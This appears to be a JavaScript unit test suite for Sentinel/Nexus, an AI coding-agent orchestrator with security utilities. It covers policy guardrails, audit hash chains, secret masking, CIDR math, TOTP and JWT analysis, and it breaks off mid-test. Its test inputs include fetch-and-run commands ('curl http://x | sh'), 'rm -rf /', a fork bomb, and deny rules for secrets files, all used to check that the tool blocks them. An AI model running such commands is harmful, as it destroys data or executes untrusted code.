"use strict";
// Sentinel/Nexus unit suite — runs the pure lib/ subsystems. `npm test`.
// No framework, no deps: a tiny assert harness so it runs anywhere (CI included).
const os = require("os"), fs = require("fs"), path = require("path");
const { MODEL_PRICE, priceOf, isMechanical, shouldDelegate } = require("../lib/nexus/pricing");
const { geminiParse, codexParse } = require("../lib/nexus/parsers");
const { POLICY_DEFAULTS, globToRe, pathMatchesAny, policyCheck, auditLog, auditVerify } = require("../lib/governance/policy");
const { ENGINES, ENGINE_ORDER, engineCap } = require("../lib/nexus/engines");
const { scanSecrets, maskSecrets, classifyDanger, compactOutput } = require("../lib/governance/security");
const { styleNames, styleDirective } = require("../lib/cli/styles");
const { mergeMemory } = require("../lib/nexus/memory");
const { STYLES, allStyles, loadStyles } = require("../lib/cli/styles");
const { TOOL_CATALOG, discoverTools } = require("../lib/nexus/tools");
const { createBgJobs, MAX_BUF } = require("../lib/nexus/bgjobs");
const { SETTINGS, describe } = require("../lib/cli/settings");
const { pickCoderModel } = require("../lib/nexus/ollama");
const { validatePolicy, validateTeam } = require("../lib/cli/validate");
const { oneline, extractJson } = require("../lib/cli/text");
const { frameDiff, diffTokens, wordHi } = require("../lib/cli/diff");
const { TOP_PORTS, parsePorts, idHash, parseCve, cidrCalc, ipToInt, inCidr } = require("../lib/toolkit/scanutil");
const { DONE_TOKEN, loopDecision, clampRounds, loopPrompt } = require("../lib/nexus/loop");
const { defang, refang } = require("../lib/toolkit/ioc");
const { shannon, assess } = require("../lib/toolkit/entropy");
const { convert: epochConvert } = require("../lib/toolkit/epoch");
const { parseUrl } = require("../lib/toolkit/urlparse");
const { base32encode, base32decode } = require("../lib/toolkit/base32");
const { hotp, totp, secondsRemaining } = require("../lib/toolkit/totp");
const { decodeJwt, analyzeJwt } = require("../lib/toolkit/jwt");
const { parseUA } = require("../lib/toolkit/useragent");
const { portName, findByName, portLookup } = require("../lib/toolkit/ports");

let pass = 0, fail = 0;
const ok = (name, cond) => { if (cond) { pass++; } else { fail++; console.log("  \x1b[31mFAIL\x1b[0m " + name); } };
const eq = (name, a, b) => ok(name + "  (" + JSON.stringify(a) + " === " + JSON.stringify(b) + ")", JSON.stringify(a) === JSON.stringify(b));
const group = (t) => console.log("\n\x1b[1m" + t + "\x1b[0m");

group("pricing");
for (const [m, i, o] of [["opus", 15, 75], ["sonnet", 3, 15], ["haiku", 0.8, 4], ["fable", 1, 5], ["gemini-2.5-pro", 1.25, 10], ["gemini-2.5-flash", 0.3, 2.5], ["gpt-5-codex", 1.25, 10], ["o4-mini", 1.1, 4.4], ["gpt-4o", 2.5, 10], ["totally-unknown", 3, 15]])
  ok("priceOf " + m, priceOf(m).in === i && priceOf(m).out === o);
ok("isMechanical: run tests", isMechanical("run the tests"));
ok("isMechanical: NOT refactor", !isMechanical("refactor the auth module"));
ok("shouldDelegate opus->haiku on big output", shouldDelegate(5000, 2000, "opus", "haiku") === true);
ok("shouldDelegate same model = false", shouldDelegate(5000, 2000, "opus", "opus") === false);
ok("shouldDelegate weak-not-cheaper = false", shouldDelegate(5000, 2000, "haiku", "opus") === false);

group("parsers (gemini/codex structured output → real tokens)");
{
  const g = geminiParse(JSON.stringify({ response: "Here is the fix.", stats: { models: { "gemini-2.5-pro": { tokens: { prompt: 1200, candidates: 340, thoughts: 60 } } } } }));
  eq("gemini text", g.text, "Here is the fix."); eq("gemini in", g.inTok, 1200); eq("gemini out", g.outTok, 400); eq("gemini model", g.model, "gemini-2.5-pro");
  ok("gemini garbage → null", geminiParse("not json") === null);
  const c = codexParse([JSON.stringify({ type: "item.completed", item: { type: "agent_message", text: "Done." } }), JSON.stringify({ type: "turn.completed", usage: { input_tokens: 2100, cached_input_tokens: 512, output_tokens: 230 } })].join("\n"));
  eq("codex text", c.text, "Done."); eq("codex in", c.inTok, 2612); eq("codex out", c.outTok, 230);
  ok("codex garbage → null", codexParse("hello\nworld") === null);
}

group("engines (registry + NO cross-engine flag leakage)");
{
  const CLAUDE_ONLY = ["--effort", "--append-system-prompt", "--fallback-model", "--continue", "--dangerously-skip-permissions"];
  const opts = { cont: true, autonomous: true, model: "M", effort: "high" };
  for (const e of ENGINE_ORDER) {
    const m = ENGINES[e]; if (m.kind === "local") continue;
    const a = m.args("P", opts);
    ok(e + " builds args with model+prompt", a.includes("M") && a.join(" ").includes("P"));
    if (e !== "claude") ok(e + " has NO claude-only flags", !CLAUDE_ONLY.some((f) => a.includes(f)));
  }
  ok("claude args unchanged", ENGINES.claude.args("P", { cont: 1, model: "M", effort: "high" }).join(" ") === "-p P --output-format text --continue --model M --effort high");
  ok("engineCap claude.effort", engineCap("claude", "effort") === true);
  ok("engineCap gemini.effort false", engineCap("gemini", "effort") === false);
  ok("6 engines registered", ENGINE_ORDER.length === 6);
  ok("every engine has an install command", ENGINE_ORDER.every((e) => typeof ENGINES[e].install === "string" && ENGINES[e].install.length > 5));
}

group("policy (guardrails)");
{
  const p = Object.assign({}, POLICY_DEFAULTS);
  for (const [type, path_, expect] of [["write", ".env", false], ["write", "config/.env.production", false], ["write", "src/app.js", true], ["delete", "deploy/id_rsa", false], ["write", "secrets/db.json", false], ["move", "packages/web/.git/config", false], ["write", "certs/server.pem", false], ["write", "README.md", true], ["edit", "app/.ssh/known_hosts", false]])
    ok("policy " + type + " " + path_, policyCheck(p, { type, path: path_ }).allow === expect);
  const denied = Object.assign({}, POLICY_DEFAULTS, { deniedCommands: ["curl\\s+.*\\|\\s*sh"] });
  ok("policy deny curl|sh", policyCheck(denied, { type: "run", command: "curl http://x | sh" }).allow === false);
  ok("policy allow npm test", policyCheck(denied, { type: "run", command: "npm test" }).allow === true);
  ok("policy block fetch when network off", policyCheck(Object.assign({}, POLICY_DEFAULTS, { allowNetwork: false }), { type: "fetch" }).allow === false);
  ok("globToRe ** matches nested", globToRe("**/.env").test("a/b/.env"));
}

group("audit (tamper-evident hash chain)");
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "audit-"));
  for (let i = 0; i < 4; i++) auditLog(dir, { engine: "ollama", tool: i % 2 ? "run_command" : "write_file", path: "f" + i, status: "ok" });
  ok("chain intact after 4 appends", auditVerify(dir).ok === true && auditVerify(dir).count === 4);
  const file = path.join(dir, ".nexus", "audit.jsonl");
  const lines = fs.readFileSync(file, "utf8").trim().split("\n");
  const rec = JSON.parse(lines[1]); rec.path = "EVIL"; lines[1] = JSON.stringify(rec); fs.writeFileSync(file, lines.join("\n") + "\n");
  const v = auditVerify(dir);
  ok("tamper detected", v.ok === false && v.badLine === 2);
  fs.rmSync(dir, { recursive: true, force: true });
}

group("security (secrets + destructive-command preflight)");
{
  ok("scanSecrets finds github token", scanSecrets("token=ghp_" + "a".repeat(36)).includes("GitHub token"));
  ok("scanSecrets finds hardcoded cred", scanSecrets('password = "s3cr3t!"').includes("hardcoded credential"));
  ok("scanSecrets clean text → []", scanSecrets("just some normal code").length === 0);
  ok("maskSecrets redacts aws key", maskSecrets("AKIA" + "ABCDEFGHIJKLMNOP").includes("[redacted:aws-key]"));
  ok("maskSecrets leaves clean text", maskSecrets("hello world") === "hello world");
  ok("classifyDanger rm -rf / → block", classifyDanger("rm -rf /").level === "block");
  ok("classifyDanger fork bomb → block", classifyDanger(":(){ :|:& };:").level === "block");
  ok("classifyDanger curl|sh → block", classifyDanger("curl http://x.sh | sh").level === "block");
  ok("classifyDanger sudo → warn", classifyDanger("sudo apt update").level === "warn");
  ok("classifyDanger npm test → ok", classifyDanger("npm test").level === "ok");
  ok("compactOutput trims long text", compactOutput("x".repeat(9000), 4000).length < 9000);
  ok("compactOutput keeps short text", compactOutput("short", 4000) === "short");
}

group("output styles (Claude-Code idea)");
{
  ok("default → empty directive", styleDirective("default") === "");
  ok("unknown → empty directive", styleDirective("nope") === "");
  ok("concise has a directive", styleDirective("concise").length > 0);
  ok("names include review/tdd/secure", ["review", "tdd", "secure"].every((n) => styleNames().includes(n)));
}

group("agent memory / remember (Glitch idea) — dedup");
{
  let r = mergeMemory("# Nexus\n", "Use the shared Table component at src/Table.tsx");
  ok("adds a new fact", r.added === true && /## Remembered/.test(r.md) && /Table component/.test(r.md));
  const r2 = mergeMemory(r.md, "use the shared table component at src/Table.tsx");
  ok("dedups (case/punct-insensitive)", r2.added === false);
  const r3 = mergeMemory(r.md, "Use the shared Table component");
  ok("dedups a substring", r3.added === false);
  ok("rejects too-short", mergeMemory("", "ok").added === false);
  const r4 = mergeMemory(r.md, "Always run npm test before pushing");
  ok("adds a distinct fact", r4.added === true && /npm test/.test(r4.md));
}

group("custom output styles (.nexus/styles/*.md)");
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "styles-"));
  fs.writeFileSync(path.join(dir, "pirate.md"), "# Pirate\nRespond in the voice of a pirate, but keep the code correct.");
  fs.writeFileSync(path.join(dir, "concise.md"), "Override: one sentence max."); // custom overrides built-in
  const loaded = loadStyles(dir);
  ok("loads custom style from md", loaded.pirate.startsWith("Respond in the voice"));
  ok("strips the leading heading", !loaded.pirate.startsWith("#"));
  const all = allStyles(dir);
  ok("merges built-ins + custom", all.review === STYLES.review && all.pirate);
  ok("custom overrides built-in", all.concise === "Override: one sentence max.");
  ok("missing dir → just built-ins", Object.keys(allStyles(path.join(dir, "nope"))).length === Object.keys(STYLES).length);
  fs.rmSync(dir, { recursive: true, force: true });
}

group("discover tool (Glitch idea)");
{
  const r = discoverTools("search files", TOOL_CATALOG).map((t) => t.name);
  ok("query matches search + find", r.includes("search") && r.includes("find"));
  ok("query 'http' finds http_fetch", discoverTools("http", TOOL_CATALOG).some((t) => t.name === "http_fetch"));
  ok("empty query → all tools", discoverTools("", TOOL_CATALOG).length === TOOL_CATALOG.length);
  ok("no match → empty", discoverTools("zzzznomatch", TOOL_CATALOG).length === 0);
}

group("background jobs (Claude-Code idea) — state machine");
{
  const bg = createBgJobs();
  const id = bg.start("npm run dev", { kill() { this.killed = true; } }, 1000);
  ok("starts running", bg.get(id).status === "running" && bg.running() === 1);
  bg.append(id, "listening on :3000\n"); bg.append(id, "compiled\n");
  ok("buffers output", bg.tail(id).includes("listening on :3000") && bg.tail(id).includes("compiled"));
  ok("list shape", bg.list()[0].id === id && bg.list()[0].status === "running" && bg.list()[0].bytes > 0);
  bg.finish(id, 0);
  ok("finish -> done, running=0", bg.get(id).status === "done" && bg.get(id).code === 0 && bg.running() === 0);
  ok("finish is idempotent", (bg.finish(id, 7), bg.get(id).code === 0)); // already done, code unchanged
  const bg2 = createBgJobs(); const child = { killed: false, kill() { this.killed = true; } };
  const id2 = bg2.start("sleep 999", child, 0); bg2.killAll();
  ok("killAll kills running + marks killed", child.killed === true && bg2.get(id2).status === "killed");
  const bg3 = createBgJobs(); const id3 = bg3.start("x", null, 0); bg3.append(id3, "y".repeat(MAX_BUF + 5000));
  ok("output buffer is bounded", bg3.get(id3).out.length <= MAX_BUF);
  const bg4 = createBgJobs(); const kc = { kill() { this.k = true; } }; const id4 = bg4.start("srv", kc, 0);
  ok("stop() kills a specific job", bg4.stop(id4) === true && kc.k === true && bg4.get(id4).status === "killed");
  ok("stop() unknown id → false", bg4.stop("nope") === false);
}

group("settings schema (data-driven /settings panel)");
{
  const v = { engine: "claude", model: "opus", effort: "high", fallback: "", style: "review", lean: true, cowork: { on: true, strong: "opus", weak: "haiku" }, costCap: 5, cost: 0.1234, mode: "plan", guard: "enforce", policyOrg: true, audit: true, redact: true, offline: false, notify: true, ctxPct: 42, pins: 2, bgRunning: 1 };
  const d = describe(v);
  ok("groups present", d.map((g) => g.group).join(",") === "Model,Output,Cost,Safety & policy,Privacy,Session");
  const flat = {}; d.forEach((g) => g.rows.forEach((r) => (flat[r.label] = r.value)));
  ok("engine value", flat["Engine"] === "claude");
  ok("style value", flat["Output style"] === "review");
  ok("lean on", flat["Lean output"] === "on");
  ok("cowork rendered", flat["Cowork (strong+weak)"] === "opus -> haiku");
  ok("budget rendered", flat["Budget cap"] === "$5.00");
  ok("policy org-enforced", flat["Security policy"] === "org-enforced");
  ok("every row has a cmd", d.every((g) => g.rows.every((r) => r.cmd && r.cmd.length)));
}

group("ollama coder-model selection");
{
  ok("prefers qwen2.5-coder", pickCoderModel(["llama3.2:3b", "qwen2.5-coder:7b", "mistral"]) === "qwen2.5-coder:7b");
  ok("priority order (deepseek over codellama)", pickCoderModel(["codellama:7b", "deepseek-coder:6.7b"]) === "deepseek-coder:6.7b");
  ok("falls back to code-ish", pickCoderModel(["mystery-code-model", "random"]) === "mystery-code-model");
  ok("falls back to first", pickCoderModel(["random1", "random2"]) === "random1");
  ok("empty → empty string", pickCoderModel([]) === "");
}

group("config validation (.nexus/policy.json + team.json)");
{
  ok("valid policy → no warnings", validatePolicy({ protectedPaths: ["*.env"], blockSecrets: true, maxFilesPerTurn: 5 }).length === 0);
  ok("protectedPaths wrong type", validatePolicy({ protectedPaths: "nope" })[0].includes("must be an array"));
  ok("blockSecrets wrong type", validatePolicy({ blockSecrets: "yes" })[0].includes("true or false"));
  ok("negative maxFilesPerTurn", validatePolicy({ maxFilesPerTurn: -1 }).some((s) => />= 0/.test(s)));
  ok("invalid denied-command regex", validatePolicy({ deniedCommands: ["("] }).some((s) => /invalid regex/.test(s)));
  ok("non-object policy", validatePolicy(42)[0].includes("must be a JSON object"));
  ok("valid team → no warnings", validateTeam({ roles: [{ role: "builder", engine: "claude" }], maxRounds: 2 }, ["claude", "ollama"]).length === 0);
  ok("team role missing engine", validateTeam({ roles: [{ role: "builder" }] }).some((s) => /missing 'engine'/.test(s)));
  ok("team unknown engine", validateTeam({ roles: [{ role: "x", engine: "gpt9" }] }, ["claude"]).some((s) => /unknown engine/.test(s)));
  ok("team bad maxRounds", validateTeam({ maxRounds: 0 }).some((s) => />= 1/.test(s)));
}

group("edge cases");
{
  // mergeMemory: appends under an existing section rather than duplicating the header
  const r = mergeMemory("# P\n\n## Remembered\n- Existing rule\n", "A brand new rule");
  ok("remember reuses existing section", (r.md.match(/## Remembered/g) || []).length === 1 && /A brand new rule/.test(r.md));
  // maskSecrets: multiple secrets in one blob
  const masked = maskSecrets("aws AKIA" + "ABCDEFGHIJKLMNOP" + " gh ghp_" + "z".repeat(36) + " goog AIza" + "y".repeat(35));
  ok("masks several secret types at once", masked.includes("[redacted:aws-key]") && masked.includes("[redacted:github-token]") && masked.includes("[redacted:google-key]"));
  // globToRe: leading-dot files and single-char wildcard
  ok("globToRe .env.* matches .env.prod", globToRe(".env.*").test(".env.prod"));
  ok("globToRe ? single char", globToRe("id_rsa?").test("id_rsa1") && !globToRe("id_rsa?").test("id_rsaXY"));
  // priceOf: case-insensitive
  ok("priceOf OPUS (caps)", priceOf("OPUS").out === 75);
  // describe: tolerates a sparse/empty state without throwing
  ok("settings describe empty state", describe({}).length === 6 && describe({}).every((g) => g.rows.length > 0));
  // codexParse: multiple agent messages -> last wins
  ok("codex takes the latest message", codexParse([JSON.stringify({ type: "item.completed", item: { type: "agent_message", text: "first" } }), JSON.stringify({ type: "item.completed", item: { type: "agent_message", text: "final answer" } })].join("\n")).text === "final answer");
  // discoverTools: case-insensitive keyword
  ok("discover is case-insensitive", discoverTools("HTTP", TOOL_CATALOG).some((t) => t.name === "http_fetch"));
}

group("text helpers");
{
  ok("oneline collapses whitespace", oneline("a\n  b\t c") === "a b c");
  ok("oneline truncates with ellipsis", oneline("abcdefghij", 5) === "abcd…" && oneline("abcdefghij", 5).length === 5);
  ok("oneline short passes through", oneline("hi", 10) === "hi");
  ok("extractJson from noisy text (obj)", extractJson("blah {\"a\":1} tail").a === 1);
  ok("extractJson array", Array.isArray(extractJson("x [1,2,3] y")) && extractJson("x [1,2,3] y")[2] === 3);
  ok("extractJson fallback on garbage", extractJson("no json here", "FB") === "FB");
}

group("render helpers (frameDiff + wordHi) — the trickiest pure algorithms");
{
  const E = "\x1b";
  ok("frameDiff full redraw starts [H ends [J", frameDiff(null, ["a", "b", "c"], E).startsWith(E + "[H") && frameDiff(null, ["a"], E).endsWith(E + "[J"));
  ok("frameDiff rewrites only the changed row", frameDiff(["a", "b", "c"], ["a", "X", "c"], E) === E + "[2;1HX" + E + "[K");
  ok("frameDiff identical → empty", frameDiff(["a", "b"], ["a", "b"], E) === "");
  ok("frameDiff row-count change → full", frameDiff(["a"], ["a", "b"], E).startsWith(E + "[H"));
  ok("frameDiff two changes target rows 2 & 4", frameDiff(["a", "b", "c", "d"], ["a", "B", "c", "D"], E) === E + "[2;1HB" + E + "[K" + E + "[4;1HD" + E + "[K");
  // wordHi (force color on for deterministic testing)
  const [m1, p1] = wordHi("const total = 22;", "const total = 12;", true);
  ok("wordHi marks the changed token bold+underline", m1.includes("\x1b[1;4;31m22") && p1.includes("\x1b[1;4;32m12"));
  ok("wordHi dims carried tokens", m1.includes("\x1b[2;31mconst") && p1.includes("\x1b[2;32mtotal"));
  const strip = (s) => s.replace(/\x1b\[[0-9;]*m/g, "");
  ok("wordHi preserves the visible text", strip(m1) === "const total = 22;" && strip(p1) === "const total = 12;");
  ok("wordHi with color off returns plain", JSON.stringify(wordHi("a x", "a y", false)) === JSON.stringify(["a x", "a y"]));
  ok("diffTokens splits words/space/punct", JSON.stringify(diffTokens("a=1")) === JSON.stringify(["a", "=", "1"]));
}

group("security console core (scan/hash/cve)");
{
  ok("parsePorts top → TOP_PORTS", parsePorts("top") === TOP_PORTS && parsePorts("") === TOP_PORTS);
  ok("parsePorts range 20-25", JSON.stringify(parsePorts("20-25")) === JSON.stringify([20, 21, 22, 23, 24, 25]));
  ok("parsePorts list 80,443,8080", JSON.stringify(parsePorts("80,443,8080")) === JSON.stringify([80, 443, 8080]));
  ok("parsePorts drops out-of-range", JSON.stringify(parsePorts("0,80,70000,-1,443")) === JSON.stringify([80, 443]));
  ok("idHash MD5/NTLM (32 hex)", idHash("5f4dcc3b5aa765d61d8327deb882cf99").startsWith("MD5"));
  ok("idHash SHA-1 (40 hex)", idHash("a".repeat(40)).startsWith("SHA-1"));
  ok("idHash SHA-256 (64 hex)", idHash("a".repeat(64)).startsWith("SHA-256"));
  ok("idHash bcrypt", idHash("$2y$10$abcdefghijklmnopqrstuv") === "bcrypt");
  ok("idHash unknown", idHash("hello") === "unknown");
  const cve = parseCve({ cve: { id: "CVE-2021-44228", published: "2021-12-10T10:15:09.143", descriptions: [{ lang: "en", value: "Log4Shell RCE" }], metrics: { cvssMetricV31: [{ cvssData: { baseScore: 10, baseSeverity: "CRITICAL" } }] } } });
  ok("parseCve extracts id/desc/score/sev/date", cve.id === "CVE-2021-44228" && cve.desc === "Log4Shell RCE" && cve.score === 10 && cve.sev === "CRITICAL" && cve.published === "2021-12-10");
  // cidr subnet math (bit ops — off-by-one prone)
  const c24 = cidrCalc("192.168.1.0/24");
  ok("cidr /24 network+broadcast", c24.network === "192.168.1.0" && c24.broadcast === "192.168.1.255");
  ok("cidr /24 netmask + 254 hosts", c24.netmask === "255.255.255.0" && c24.hosts === 254);
  ok("cidr /24 usable range", c24.firstUsable === "192.168.1.1" && c24.lastUsable === "192.168.1.254");
  ok("cidr non-aligned ip snaps to network", cidrCalc("10.0.0.130/25").network === "10.0.0.128" && cidrCalc("10.0.0.130/25").broadcast === "10.0.0.255");
  ok("cidr /31 → 2 hosts (point-to-point)", cidrCalc("10.0.0.0/31").hosts === 2);
  ok("cidr /32 → 1 host", cidrCalc("10.0.0.5/32").hosts === 1 && cidrCalc("10.0.0.5/32").network === "10.0.0.5");
  ok("cidr /0 → whole space", cidrCalc("0.0.0.0/0").netmask === "0.0.0.0" && cidrCalc("0.0.0.0/0").broadcast === "255.255.255.255");
  ok("cidr invalid → null", cidrCalc("not-a-cidr") === null && cidrCalc("192.168.1.0/33") === null && cidrCalc("999.1.1.1/24") === null);
  // ip-in-cidr membership
  ok("ipToInt round values", ipToInt("0.0.0.0") === 0 && ipToInt("255.255.255.255") === 4294967295 && ipToInt("256.0.0.0") === null);
  ok("inCidr inside /24", inCidr("192.168.1.50", "192.168.1.0/24") === true);
  ok("inCidr outside /24", inCidr("192.168.2.1", "192.168.1.0/24") === false);
  ok("inCidr boundary /25", inCidr("10.0.0.130", "10.0.0.128/25") === true && inCidr("10.0.0.127", "10.0.0.128/25") === false);
  ok("inCidr /0 matches all", inCidr("8.8.8.8", "0.0.0.0/0") === true);
  ok("inCidr invalid → null", inCidr("bad", "192.168.1.0/24") === null && inCidr("1.2.3.4", "nope") === null);
}

group("autonomous loop controller (Nexus /loop)");
{
  ok("continues mid-loop", loopDecision(2, 6, "did some work").stop === false);
  ok("stops on GOAL-DONE token", loopDecision(2, 6, "all set. " + DONE_TOKEN).stop === true && loopDecision(2, 6, "x " + DONE_TOKEN).reason === "goal complete");
  ok("stops at the round cap", loopDecision(6, 6, "more to do").stop === true && /limit/.test(loopDecision(6, 6, "x").reason));
  ok("DONE detection is case-insensitive", loopDecision(1, 6, "done: goal-done").stop === true);
  ok("clampRounds default", clampRounds(undefined, 6) === 6 && clampRounds("abc", 6) === 6);
  ok("clampRounds bounds 1..20", clampRounds(0) === 1 && clampRounds(999) === 20 && clampRounds("3") === 3);
  ok("loopPrompt includes goal + round + done token", loopPrompt("ship the CSS", 2, 5, "").includes("ship the CSS") && loopPrompt("g", 2, 5, "").includes("2/5") && loopPrompt("g", 1, 5, "").includes(DONE_TOKEN));
  ok("loopPrompt threads the previous note", loopPrompt("g", 3, 5, "prev output").includes("prev output"));
}

group("IOC defang / refang tool");
{
  ok("defang neutralizes scheme + dots", defang("http://evil.com") === "hxxp[://]evil[.]com");
  ok("defang https + email", defang("https://a.b/c") === "hxxps[://]a[.]b/c" && defang("bad@evil.com") === "bad[@]evil[.]com");
  ok("defang an IP", defang("8.8.8.8") === "8[.]8[.]8[.]8");
  ok("refang reverses defang", refang("hxxp[://]evil[.]com") === "http://evil.com");
  const original = "https://evil.example.com/path?u=admin@corp.com and 10.0.0.1";
  ok("defang -> refang round-trips", refang(defang(original)) === original);
  ok("refang tolerates plain hxxp://", refang("hxxp://x[.]y") === "http://x.y");
}

group("entropy tool (secret / randomness detection)");
{
  ok("all-same char → 0 bits", shannon("aaaaaa") === 0);
  ok("empty → 0", shannon("") === 0);
  ok("4 equal symbols → 2 bits/char", Math.abs(shannon("abcd") - 2) < 1e-9);
  ok("8 equal symbols → 3 bits/char", Math.abs(shannon("abcdefgh") - 3) < 1e-9);
  ok("random 32-hex key → high", assess("9f86d081884c7d659a2feaa0c55ad015").level === "high" && assess("9f86d081884c7d659a2feaa0c55ad015").likelySecret === true);
  ok("predictable value → low", assess("password").level === "low" && assess("aaaaaaaaaaaaaaaa").level === "low");
  ok("assess reports totalBits", Math.abs(assess("abcd").totalBits - 8) < 1e-9);
}

group("epoch / timestamp converter");
{
  ok("epoch 0 → 1970 ISO", epochConvert("0").iso === "1970-01-01T00:00:00.000Z");
  ok("seconds → ISO", epochConvert("1700000000").iso === "2023-11-14T22:13:20.000Z" && epochConvert("1700000000").from === "epoch");
  ok("13-digit ms treated as ms", epochConvert("1700000000000").iso === "2023-11-14T22:13:20.000Z" && epochConvert("1700000000000").epochMs === 1700000000000);
  ok("ISO string → epoch seconds", epochConvert("2023-11-14T22:13:20Z").epochSeconds === 1700000000 && epochConvert("2023-11-14T22:13:20Z").from === "date");
  ok("provides utc + epochMs", epochConvert("1700000000").epochMs === 1700000000000 && /GMT/.test(epochConvert("1700000000").utc));
  ok("garbage → null", epochConvert("not-a-timestamp") === null);
}

group("URL parser tool");
{
  const u = parseUrl("https://user:pw@host.example.com:8443/a/b?x=1&y=2#frag");
  ok("full URL breakdown", u.scheme === "https" && u.host === "host.example.com" && u.port === "8443" && u.path === "/a/b");
  ok("query params + fragment + creds", u.params.x === "1" && u.params.y === "2" && u.fragment === "frag" && u.username === "user" && u.password === "pw");
  const s = parseUrl("example.com:8080/api?q=test");
  ok("scheme-less host:port defaults to http", s.scheme === "http" && s.host === "example.com" && s.port === "8080" && s.params.q === "test");
  ok("plain domain", parseUrl("evil.com").host === "evil.com" && parseUrl("evil.com").scheme === "http");
  ok("empty / garbage → null", parseUrl("") === null && parseUrl("http://") === null);
}

group("base32 (RFC 4648 test vectors)");
{
  ok("empty", base32encode("") === "");
  ok("'f' → MY======", base32encode("f") === "MY======");
  ok("'fo' → MZXQ====", base32encode("fo") === "MZXQ====");
  ok("'foo' → MZXW6===", base32encode("foo") === "MZXW6===");
  ok("'foobar' → MZXW6YTBOI======", base32encode("foobar") === "MZXW6YTBOI======");
  ok("decode reverses (padded)", base32decode("MZXW6YTBOI======") === "foobar");
  ok("decode lowercase + spaces tolerated", base32decode("mzxw6===") === "foo");
  ok("round-trips arbitrary text", base32decode(base32encode("Sentinel/Nexus 42!")) === "Sentinel/Nexus 42!");
  ok("invalid char → null", base32decode("MZXW6!!!") === null);
}

group("TOTP / HOTP (RFC 4226 / 6238 test vectors)");
{
  const key = Buffer.from("12345678901234567890"); // RFC test key
  ok("HOTP counter 0 → 755224", hotp(key, 0, 6) === "755224");
  ok("HOTP counter 1 → 287082", hotp(key, 1, 6) === "287082");
  ok("HOTP counter 2 → 359152", hotp(key, 2, 6) === "359152");
  const secret = base32encode("12345678901234567890"); // base32 form of the RFC key
  ok("TOTP T=59 (8-digit) → 94287082", totp(secret, { time: 59, digits: 8 }) === "94287082");
  ok("TOTP T=1111111109 → 07081804", totp(secret, { time: 1111111109, digits: 8 }) === "07081804");
  ok("TOTP T=20000000000 → 65353130", totp(secret, { time: 20000000000, digits: 8 }) === "65353130");
  ok("TOTP 6-digit at T=59 → 287082", totp(secret, { time: 59 }) === "287082");
  ok("TOTP invalid secret → null", totp("not base32!!!") === null && totp("") === null);
  ok("secondsRemaining within a 30s step", secondsRemaining(30, 59) === 1 && secondsRemaining(30, 45) === 15);
}

group("JWT decode + analysis");
{
  const b64u = (o) => Buffer.from(JSON.stringify(o)).toString("base64").replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
  const mk = (h, p) => b64u(h) + "." + b64u(p) + ".sig";
  const expired = mk({ alg: "HS256", typ: "JWT" }, { sub: "user1", exp: 1000000000 }); // exp = 2001
  const a1 = analyzeJwt(expired, 2000000000);
  ok("decodes header + payload", a1.header.alg === "HS256" && a1.payload.sub === "user1");
  ok("flags expired token", a1.expired === true && a1.state === "expired");
  const valid = mk({ alg: "HS256" }, { exp: 3000000000 });
  ok("valid (unexpired) token", analyzeJwt(valid, 1000000000).expired === false && analyzeJwt(valid, 1000000000).state === "valid");
  const nbf = mk({ alg: "HS256" }, { nbf: 5000000000 });
  ok("not-yet-valid (nbf future)", analyzeJwt(nbf, 1000000000).notYetValid === true);
  const none = mk({ alg: "none" }, { sub: "x" });
  ok("warns on alg=none", analyzeJwt(none).alg === "none" && analyzeJwt(none).warnings.some((w) => /alg=none/.test(w)));
  ok("no-exp token → state no-exp", analyzeJwt(mk({ alg: "HS256" }, { sub: "x" })).state === "no-exp");
  ok("garbage → null", analyzeJwt("not.a.jwt.x") === null && analyzeJwt("only-one-part") === null && decodeJwt("") === null);
}

group("User-Agent parser");
{
  const chrome = parseUA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
  ok("Chrome on Windows 10 (not Safari)", chrome.browser === "Chrome" && chrome.version.startsWith("120") && chrome.os === "Windows 10/11" && chrome.device === "desktop");
  const iphone = parseUA("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1");
  ok("Safari on iOS mobile", iphone.browser === "Safari" && /iOS 17/.test(iphone.os) && iphone.device === "mobile");
  const edge = parseUA("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36 Edg/120.0");
  ok("Edge (before Chrome)", edge.browser === "Edge");
  const android = parseUA("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36");
  ok("Android mobile", /Android 14/.test(android.os) && android.device === "mobile");
  ok("curl is a bot", parseUA("curl/8.4.0").browser === "curl" && parseUA("curl/8.4.0").bot === true);
  ok("Googlebot detected", parseUA("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)").bot === true);
  ok("empty → null", parseUA("") === null && parseUA(null) === null);
}

group("port <-> service lookup");
{
  ok("portName 22 → ssh, 3306 → mysql", portName(22) === "ssh" && portName(3306) === "mysql");
  ok("portName unknown → null", portName(9999) === null);
  ok("findByName redis → [6379]", JSON.stringify(findByName("redis")) === JSON.stringify([6379]));
  ok("portLookup number", portLookup("3306").kind === "port" && portLookup("3306").service === "mysql");
  ok("portLookup unknown number → null service", portLookup("9999").service === null);
  ok("portLookup name → sorted ports", portLookup("mysql").kind === "name" && JSON.stringify(portLookup("mysql").ports) === JSON.stringify([3306]));
  ok("portLookup http-family matches several", portLookup("http").ports.length >= 4);
  ok("empty → null", portLookup("") === null);
}

group("command registry (batch 1)");
{
  const { CMDS, CMD_MAP } = require("../lib/cli/registry");
  const plain = { red: (s) => s, green: (s) => s, yellow: (s) => s, cyan: (s) => s, gray: (s) => s, bold: (s) => s };
  ok("names + aliases are unique", (() => { const seen = new Set(); for (const cmd of CMDS) { for (const n of [cmd.name, ...(cmd.aliases || [])]) { if (seen.has(n)) return false; seen.add(n); } } return true; })());
  ok("every run() returns a string", CMDS.every((cmd) => typeof cmd.run({ rest: [], c: plain }) === "string"));
  ok("aliases resolve to the same entry", CMD_MAP.inrange === CMD_MAP.incidr);
  eq("defang output matches", CMD_MAP.defang.run({ rest: ["http://evil.com/path"], c: plain }), "hxxp[://]evil[.]com/path");
